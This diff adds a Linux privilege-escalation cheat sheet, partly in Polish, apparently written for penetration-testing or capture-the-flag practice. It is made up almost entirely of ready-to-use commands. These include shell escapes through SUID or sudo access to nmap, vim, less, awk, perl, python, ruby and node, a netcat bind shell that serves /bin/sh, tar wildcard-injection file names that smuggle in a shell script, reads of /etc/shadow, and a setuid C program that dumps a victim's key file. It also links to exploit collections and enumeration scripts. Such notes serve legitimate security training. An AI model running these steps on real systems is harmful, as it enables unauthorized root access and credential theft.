@@ -1,0 +1,167 @@
+
+Created by Krzysztof Gajewski 
+https://www.linkedin.com/in/krzysztof-gajewski-537683b9/ 
+
+1. Exploits
+- lsb_release -a
+- uname -a 
+- cat /etc/*-release
+- https://github.com/lucyoa/kernel-exploits
+- https://pentestlab.blog/2017/04/24/windows-kernel-exploits/
+
+How to run exploit:
+- cd /tmp
+- $ touch exploit.c
+- $ vim exploit.c
+- $ gcc exploit.c -o exploit
+- $ ./exploit
+
+2. Wildcard Injection
+- komenda rm i folder -rf, folder -rf zostanie dodany do polecenia rm jako parametr.
+- komenda tar, plik o nazwie "--checkpoint=1" i "--checkpoint-action=sh rshell.sh"
+
+3. Crontab
+- ls /etc/cron*
+- cat /etc/cron*
+
+4. SUID Executable
+- find / -perm -u=s -type f 2>/dev/null
+- find / -user root -perm -4000 -print 2>/dev/null
+- find / -user root -perm -4000 -exec ls -ldb {} \;
+
+Programs:
+- nmap
+- Vim
+- find
+- Bash
+- More
+- Less
+- Nano
+- cp
+- tcpdump
+- awk
+
+NMAP
+- nmap -V (version 4.53)
+- nmap --interactive 
+- nmap> !sh
+
+- nmap --script <( echo 'require "os".execute "/bin/sh"')
+
+- echo “os.execute(‘/bin/sh’)” > x.nse
+- sudo nmap –script=x.nse
+
+Metasploit method:
+exploit/unix/local/setuid_nmap
+
+FIND
+- touch pentestlab
+- find pentestlab -exec whoami \;
+
+find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
+
+VIM
+- vim.tiny /etc/shadow
+
+- vim.tiny
+- # Press ESC key
+- :set shell=/bin/sh
+- :shell
+
+VIM
+- Reading the file can be done directly by specifying the file's path on the command line after the command or by opening the 
+file inside vim (using :r [PATH]).
+- To gain a shell as the user victim, you can start vim then you can type the following: :!/bin/bash to run /bin/bash
+
+Bash
+- bash -p
+- bash-3.2# id
+- uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
+
+LESS
+- less /etc/passwd
+- !/bin/bash (inside)
+
+AWK
+- Reading the file can be done directly by specifying the file's path on the command line after the command: 
+awk '{print $1}' /home/victim/key.txt
+
+- To gain a shell as the user victim, you can use the following command:
+awk 'BEGIN {system("/bin/bash")}'
+
+TCPDUMP
+- tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root”
+- we have to put commands into /tmp/.test
+
+5. SUDO users
+- /etc/sudoers
+- sudo -l
+- sudo -u
+
+SUDO got privilige to run PERL as other user
+- sudo -u victim perl -e 'system("/bin/bash")
+
+SUDO got privilige to run PYTHON as other user
+- pentesterlab@c74b5064f15a:~$ sudo -u victim python
+>>> from subprocess import call
+>>> call('id')
+uid=1001(victim) gid=1001(victim) groups=1001(victim)
+>>> call('/bin/bash')
+
+SUDO got privilige to run RUBY as other user
+- sudo -u victim /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
+irb(main):005:0> `id` (znaczek koło tyldy)
+=> "uid=1001(victim) gid=1001(victim) groups=1001(victim)\n"
+
+SUDO got privilige to run JAVA as other user
+- sudo -u victim node -e "var exec = require('child_process').exec;
+exec('[COMMAND]', function (error, stdOut, stdErr) {
+console.log(stdOut);
+});"
+
+6. Path 
+- printenv
+
+.:/bin:/usr/sbin …. pozwala na wykonaniue pliku wykonywalnego bez podawania "./"
+
+- PATH=.:${PATH}
+- export PATH
+
+- PATH=echo $PATH | sed -e 's/::/:/g; s/:.:/:/g; s/:.$//; s/^://'
+ 
+ 
+7. Check compiler
+- find / -name perl<em>
+- find / -name python</em>
+- find / -name gcc*
+- find / -name cc
+
+8. Check how we can transfer data
+- find / -name wget
+- find / -name nc<em>
+- find / -name netcat</em>
+- find / -name tftp*
+- find / -name ftp
+
+9. Check IPTables
+- iptables -L
+
+10. Program in C then as VICTIM copy file and change permission. (chmod +xs)
+
+int main(void)
+{
+system("cat /home/victim/key.txt");
+}
+
+11. Scripts
+LinEnum 
+- /LinEnum.sh -k keyword -r report -e /tmp/ -t
+- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+LinuxPrivChecker 
+- skrypt w Pythonie
+- https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+unix-privesc-check 
+- skrypt na Linux, Solaris, HPUX, FreeBSD
+- https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh
